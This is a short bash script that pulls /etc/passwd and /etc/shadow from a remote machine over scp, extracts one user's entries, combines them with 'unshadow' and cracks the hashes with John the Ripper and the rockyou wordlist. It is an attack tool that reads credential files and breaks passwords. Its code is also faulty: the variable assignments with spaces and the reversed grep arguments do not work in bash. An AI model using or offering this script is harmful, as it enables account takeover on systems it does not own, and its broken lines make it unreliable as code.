#! /bin/bash

if [[ $1 = "-d" ]]; then
  scp $2:/etc/passwd passwd
  scp $2:/etc/shadow shadow

  username = $3
else
  username = $1
fi

grep passwd $username | tee passwd.only
grep shadow $username | tee shadow.only

unshadow passwd.only shadow.only > unshadowed
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
